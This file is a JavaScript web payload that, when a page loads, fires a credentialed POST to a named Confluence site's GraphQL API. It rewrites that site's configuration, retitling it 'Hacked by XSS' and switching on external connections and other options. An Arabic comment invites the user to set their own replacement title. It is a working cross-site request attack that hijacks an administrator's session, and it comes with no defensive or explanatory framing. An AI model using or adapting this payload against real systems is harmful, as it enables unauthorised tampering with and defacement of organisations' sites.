function loadDoc1() {
  var xhttp = new XMLHttpRequest();

  xhttp.open("POST", "https://anshall.atlassian.net/cgraphql?q=ConfigurationFormConfigurationPageUpdateMutation", true);

  xhttp.setRequestHeader("Content-type", "application/json");
  xhttp.setRequestHeader("Accept", "*/*");

  xhttp.withCredentials = true;

  var data = JSON.stringify([{
    "operationName": "ConfigurationFormConfigurationPageUpdateMutation",
    "variables": {
      "siteConfigInput": {
        "siteTitle": "Hacked by XSS", // العنوان الجديد الذي تريد وضعه
        "customContactMessage": "xxxx",
        "isContactAdministratorsFormEnabled": true,
        "siteHomePage": "Confluence Home",
        "isEditorConversionForSiteEnabled": true,
        "isEditorFullWidthEnabled": false,
        "isEmailNotificationEnabled": true,
        "isPushNotificationEnabled": true,
        "isLikesEnabled": true,
        "timeFormat": "h:mm a",
        "dateTimeFormat": "MMM dd, yyyy HH:mm",
        "dateFormat": "MMM dd, yyyy",
        "longNumberFormat": "###############",
        "decimalNumberFormat": "###############.##########",
        "maxAttachmentSize": 104857600,
        "maxNumberOfAttachmentsPerUpload": 6,
        "isExternalConnectionsEnabled": true,
        "connectionTimeout": 10000,
        "socketTimeout": 10000,
        "globalDefaultLocale": "en_US",
        "indexingLanguage": "english"
      }
    },
    "query": "mutation ConfigurationFormConfigurationPageUpdateMutation($siteConfigInput: ConfluenceUpdateSiteConfigurationInput!) {\n  confluence {\n    updateSiteConfiguration(input: $siteConfigInput) {\n      errors {\n        message\n        extensions {\n          errorType\n          statusCode\n          __typename\n        }\n        __typename\n      }\n      success\n      __typename\n    }\n    __typename\n  }\n}\n"
  }]);

  xhttp.send(data);
}

window.onload = loadDoc1;
